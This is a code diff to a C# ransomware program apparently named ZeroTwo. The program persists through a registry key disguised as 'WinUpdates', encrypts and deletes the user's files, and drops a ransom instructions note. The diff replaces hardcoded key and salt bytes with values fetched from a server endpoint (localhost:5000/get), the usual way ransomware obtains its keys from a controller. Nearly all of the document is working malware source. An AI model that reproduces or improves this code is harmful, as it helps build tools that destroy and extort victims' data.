@@ -4,6 +4,9 @@ using System.Security.Cryptography;
 using System.Reflection;
 using System.Diagnostics;
 using Microsoft.Win32;
+using System.Net;
+using System.Text;
+using System.Web.Script.Serialization;
 
 namespace ZeroTwo.src {
     class ZeroTwo {
@@ -19,18 +22,34 @@ namespace ZeroTwo.src {
         private const string REG_KEY = "UpdatesHandler";
         private const string EXE_NAME = "WinUpdates";
 
-        public static void Main(string[] args) {
+        private static byte[] k = null;
+        private static byte[] s = null;
 
+        public static void Main(string[] args) {
             if (args.Length == 0) {
                 InjectInReg();
                 ExtrRes();
                 OpenImage();
             } else {
+                SetKandS();
                 int op = int.Parse(args[0]);
                 Exec(op);
                 if (op == ENC) {
                     ReleaseIstructions();
                 }
+            }
+        }
+        public static void SetKandS() {
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://localhost:5000/get");
+            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
+            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+            using (Stream stream = response.GetResponseStream())
+            using (StreamReader reader = new StreamReader(stream)) {
+                JavaScriptSerializer serializer = new JavaScriptSerializer();
+                Resp resp = serializer.Deserialize<Resp>(reader.ReadToEnd());
+                Console.WriteLine(s);
+                k = Encoding.ASCII.GetBytes(resp.k);
+                s = Encoding.ASCII.GetBytes(resp.s);
             }
         }
 
@@ -128,20 +147,20 @@ namespace ZeroTwo.src {
             if (op == ENC) {
                 foreach (string file in files) {
                     if (!Path.GetExtension(file).Equals(EXT) && !Path.GetExtension(file).Equals(".ini") && !Path.GetExtension(file).Equals(".exe")) {
-                        ToggleCipher(true, file, file + EXT, new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
+                        ToggleCipher(true, file, file + EXT, k);
                     }
                 }
             } else if (op == DEC) {
                 foreach (string file in files) {
                     if (Path.GetExtension(file).Equals(EXT)) {
-                        ToggleCipher(false, file, file.Remove(file.Length - EXT.Length), new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
+                        ToggleCipher(false, file, file.Remove(file.Length - EXT.Length), k);
                     }
                 }
             }
         }
 
         private static void ToggleCipher(bool encryptMode, string inputFile, string outputFile, byte[] passwordBytes) {
-            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+            byte[] saltBytes = s;
             string cryptFile = null;
             if (encryptMode) {
                 cryptFile = outputFile;
@@ -198,7 +217,6 @@ namespace ZeroTwo.src {
             File.Delete(inputFile);
         }
 
-
         public static void ReleaseIstructions() {
             var assembly = Assembly.GetExecutingAssembly();
             var instructionsRes = "ZeroTwo.src.txt.Instructions";
@@ -210,6 +228,12 @@ namespace ZeroTwo.src {
                 File.WriteAllText(instructionsPath, instructions);
                 Process.Start(instructionsPath);
             }
+        }
+
+        public class Resp {
+            public string i;
+            public string k;
+            public string s;
         }
     }
 }
